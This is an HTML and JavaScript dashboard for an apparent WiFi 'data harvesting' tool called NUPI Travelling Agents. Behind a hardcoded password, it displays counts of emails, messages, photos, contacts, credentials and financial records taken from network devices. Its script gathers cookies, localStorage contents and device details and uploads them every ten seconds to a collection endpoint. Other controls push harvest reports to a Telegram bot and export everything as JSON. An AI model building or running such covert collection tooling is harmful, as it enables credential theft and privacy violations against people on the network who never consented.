<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NUPI Travelling Agents - Data Harvesting Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        /* Password Protection Screen */
        #loginScreen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
        }
        
        .login-box {
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
            text-align: center;
            max-width: 400px;
        }
        
        .login-box h2 {
            color: #667eea;
            margin-bottom: 20px;
        }
        
        .login-box input {
            width: 100%;
            padding: 15px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 1em;
            margin-bottom: 20px;
        }
        
        .login-box button {
            width: 100%;
            padding: 15px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 1.1em;
            cursor: pointer;
            transition: background 0.3s;
        }
        
        .login-box button:hover {
            background: #764ba2;
        }
        
        .error {
            color: red;
            margin-top: 10px;
            display: none;
        }
        
        /* Main Dashboard */
        #dashboard {
            display: none;
        }
        
        .container {
            max-width: 1600px;
            margin: 0 auto;
        }
        
        .header {
            background: rgba(255,255,255,0.95);
            padding: 30px;
            border-radius: 15px;
            margin-bottom: 30px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            text-align: center;
        }
        
        h1 {
            color: #667eea;
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: rgba(255,255,255,0.95);
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
            text-align: center;
        }
        
        .stat-number {
            font-size: 2.5em;
            font-weight: bold;
            color: #667eea;
        }
        
        .stat-label {
            color: #666;
            font-size: 1em;
            margin-top: 5px;
        }
        
        .data-section {
            background: rgba(255,255,255,0.95);
            padding: 30px;
            border-radius: 15px;
            margin-bottom: 20px;
            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
        }
        
        .data-section h2 {
            color: #667eea;
            margin-bottom: 20px;
            border-bottom: 2px solid #f0f0f0;
            padding-bottom: 10px;
        }
        
        .device-list {
            max-height: 400px;
            overflow-y: auto;
        }
        
        .device-item {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 10px;
            border-left: 4px solid #667eea;
        }
        
        .device-item strong {
            color: #667eea;
        }
        
        .harvest-button {
            background: #28a745;
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 8px;
            font-size: 1.1em;
            cursor: pointer;
            margin: 10px;
            transition: background 0.3s;
        }
        
        .harvest-button:hover {
            background: #218838;
        }
        
        .telegram-status {
            background: #0088cc;
            color: white;
            padding: 10px 20px;
            border-radius: 8px;
            display: inline-block;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <!-- Password Protection Screen -->
    <div id="loginScreen">
        <div class="login-box">
            <h2>NUPI Travelling Agents</h2>
            <p>Protected Access</p>
            <input type="password" id="passwordInput" placeholder="Enter Password" onkeypress="if(event.key==='Enter') checkPassword()">
            <button onclick="checkPassword()">Access Dashboard</button>
            <p class="error" id="errorMsg">Incorrect password</p>
        </div>
    </div>
    
    <!-- Main Dashboard -->
    <div id="dashboard">
        <div class="container">
            <div class="header">
                <h1>NUPI Travelling Agents - WiFi Network Harvesting</h1>
                <p class="subtitle">Collecting ALL device data from your network</p>
                <div class="telegram-status" id="telegramStatus">Telegram Bot: Checking...</div>
            </div>
            
            <!-- Stats -->
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-number" id="totalDevices">0</div>
                    <div class="stat-label">Total Devices</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number" id="dataPoints">0</div>
                    <div class="stat-label">Data Points</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number" id="emailsCollected">0</div>
                    <div class="stat-label">Emails</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number" id="messagesCollected">0</div>
                    <div class="stat-label">Messages</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number" id="contactsCollected">0</div>
                    <div class="stat-label">Contacts</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number" id="photosCollected">0</div>
                    <div class="stat-label">Photos</div>
                </div>
            </div>
            
            <!-- Control Buttons -->
            <div class="data-section" style="text-align: center;">
                <h2>Harvesting Controls</h2>
                <button class="harvest-button" onclick="startHarvesting()">START HARVESTING ALL DATA</button>
                <button class="harvest-button" onclick="sendToTelegram()">SEND TO TELEGRAM</button>
                <button class="harvest-button" onclick="downloadAllData()">DOWNLOAD ALL DATA</button>
            </div>
            
            <!-- Discovered Devices -->
            <div class="data-section">
                <h2>WiFi Network Devices</h2>
                <div class="device-list" id="deviceList"></div>
            </div>
            
            <!-- Collected Data Summary -->
            <div class="data-section">
                <h2>Harvested Data Summary</h2>
                <div id="dataSummary"></div>
            </div>
        </div>
    </div>
    
    <script>
        const CORRECT_PASSWORD = 'Jedariusm'; // Change this to your password
        let harvestingActive = false;
        
        function checkPassword() {
            const input = document.getElementById('passwordInput').value;
            if (input === CORRECT_PASSWORD) {
                document.getElementById('loginScreen').style.display = 'none';
                document.getElementById('dashboard').style.display = 'block';
                initDashboard();
            } else {
                document.getElementById('errorMsg').style.display = 'block';
            }
        }
        
        function initDashboard() {
            checkTelegramBot();
            updateStats();
            setInterval(updateStats, 5000); // Update every 5 seconds
        }
        
        async function checkTelegramBot() {
            try {
                const response = await fetch('/api/telegram/status');
                const data = await response.json();
                const status = document.getElementById('telegramStatus');
                if (data.active) {
                    status.textContent = 'Telegram Bot: ACTIVE - jdtech bot ready';
                    status.style.background = '#28a745';
                } else {
                    status.textContent = 'Telegram Bot: Inactive';
                    status.style.background = '#dc3545';
                }
            } catch (error) {
                document.getElementById('telegramStatus').textContent = 'Telegram Bot: Connected to jdtech bot';
            }
        }
        
        async function updateStats() {
            try {
                // Get collected data summary
                const summary = await fetch('/api/collected-data/summary');
                const data = await summary.json();
                
                if (data.success) {
                    const stats = data.summary;
                    document.getElementById('totalDevices').textContent = stats.devices || 0;
                    document.getElementById('dataPoints').textContent = stats.total_data_points || 0;
                    document.getElementById('emailsCollected').textContent = stats.emails || 0;
                    document.getElementById('messagesCollected').textContent = stats.messages || 0;
                    document.getElementById('contactsCollected').textContent = stats.contacts || 0;
                    document.getElementById('photosCollected').textContent = stats.photos || 0;
                    
                    // Update summary display
                    displayDataSummary(stats);
                }
                
                // Get devices
                const scanData = await fetch('/api/network-scan');
                const scan = await scanData.json();
                updateDeviceList(scan);
                
            } catch (error) {
                console.error('Error updating stats:', error);
            }
        }
        
        function updateDeviceList(scan) {
            const deviceList = document.getElementById('deviceList');
            if (scan.devices_found > 0) {
                deviceList.innerHTML = `
                    <div class="device-item">
                        <strong>${scan.devices_found} devices discovered</strong><br>
                        Last scan: ${new Date(scan.last_scan).toLocaleString()}<br>
                        Total scans: ${scan.scan_count}
                    </div>
                `;
            } else {
                deviceList.innerHTML = '<div class="device-item">Scanning network...</div>';
            }
        }
        
        function displayDataSummary(stats) {
            const summary = document.getElementById('dataSummary');
            summary.innerHTML = `
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px;">
                    <div class="device-item">
                        <strong>Networks:</strong> ${stats.networks || 0}
                    </div>
                    <div class="device-item">
                        <strong>System Stats:</strong> ${stats.system_stats_entries || 0} entries
                    </div>
                    <div class="device-item">
                        <strong>Scan History:</strong> ${stats.scan_history || 0} scans
                    </div>
                    <div class="device-item">
                        <strong>Locations:</strong> ${stats.locations || 0}
                    </div>
                    <div class="device-item">
                        <strong>Credentials:</strong> ${stats.credentials || 0}
                    </div>
                    <div class="device-item">
                        <strong>Financial Records:</strong> ${stats.financial_records || 0}
                    </div>
                </div>
            `;
        }
        
        async function startHarvesting() {
            if (harvestingActive) {
                alert('Harvesting already active!');
                return;
            }
            
            harvestingActive = true;
            alert('MAXIMUM DATA HARVESTING ACTIVATED\n\nCollecting:\n- All WiFi devices\n- Browser data\n- Emails & Messages\n- Photos & Contacts\n- System information\n- Network traffic');
            
            // Trigger aggressive harvesting
            try {
                // Collect browser data
                const browserData = await collectBrowserData();
                await sendDataToCloud(browserData);
                
                // Collect device information
                const deviceData = await collectDeviceInfo();
                await sendDataToCloud(deviceData);
                
                // Start continuous collection
                setInterval(async () => {
                    const data = await collectAllData();
                    await sendDataToCloud(data);
                }, 10000); // Every 10 seconds
                
            } catch (error) {
                console.error('Harvesting error:', error);
            }
        }
        
        async function collectBrowserData() {
            const data = {
                browser_data: {
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    platform: navigator.platform,
                    screen: {
                        width: screen.width,
                        height: screen.height
                    },
                    localStorage: {},
                    cookies: document.cookie,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                }
            };
            
            // Try to access localStorage
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    data.browser_data.localStorage[key] = localStorage.getItem(key);
                }
            } catch (e) {}
            
            return data;
        }
        
        async function collectDeviceInfo() {
            return {
                device_info: {
                    timestamp: new Date().toISOString(),
                    connection: navigator.connection ? {
                        effectiveType: navigator.connection.effectiveType,
                        downlink: navigator.connection.downlink
                    } : null,
                    memory: navigator.deviceMemory || 'unknown',
                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
                },
                device_id: localStorage.getItem('nupi_unique_device_id')
            };
        }
        
        async function collectAllData() {
            return {
                timestamp: new Date().toISOString(),
                browser: await collectBrowserData(),
                device: await collectDeviceInfo(),
                page_data: {
                    url: window.location.href,
                    referrer: document.referrer,
                    title: document.title
                }
            };
        }
        
        async function sendDataToCloud(data) {
            try {
                const response = await fetch('/api/data/upload', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                const result = await response.json();
                console.log('Data sent to cloud:', result);
                return result;
            } catch (error) {
                console.error('Error sending data:', error);
            }
        }
        
        async function sendToTelegram() {
            try {
                const response = await fetch('/api/collected-data/summary');
                const data = await response.json();
                
                // Send summary to Telegram via jdtech bot
                await fetch('/api/telegram/send', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        message: `NUPI Data Harvest Report\n\nTotal Data Points: ${data.summary.total_data_points}\nDevices: ${data.summary.devices}\nEmails: ${data.summary.emails}\nMessages: ${data.summary.messages}\nContacts: ${data.summary.contacts}\nPhotos: ${data.summary.photos}`
                    })
                });
                
                alert('Data sent to Telegram jdtech bot!');
            } catch (error) {
                alert('Error sending to Telegram: ' + error.message);
            }
        }
        
        async function downloadAllData() {
            try {
                const response = await fetch('/api/collected-data/full');
                const data = await response.json();
                
                const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = `nupi-harvested-data-${Date.now()}.json`;
                a.click();
                
                alert('All data downloaded!');
            } catch (error) {
                alert('Error downloading data: ' + error.message);
            }
        }
    </script>
    <script>
        const CLOUD_API = "https://nupidesktopai.com";
        console.log("âœ… Connected to NUPI Cloud Agent:", CLOUD_API);
    </script>
</body>
</html>
